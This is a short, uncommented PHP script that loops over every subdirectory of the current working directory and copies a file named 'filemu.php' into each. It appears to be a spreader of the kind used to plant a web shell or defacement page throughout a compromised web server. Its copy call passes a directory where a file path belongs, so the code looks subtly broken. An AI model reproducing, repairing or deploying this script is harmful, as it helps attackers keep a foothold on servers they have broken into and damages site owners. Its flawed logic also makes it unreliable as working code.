<?php

$file = "filemu.php";

$s = scandir(getcwd());

foreach($s as $dir)
{ if(!is_dir(getcwd().'/'.$dir) || $dir == '.' || $dir == '..')continue;

copy($file,getcwd().'/'.$dir);
}
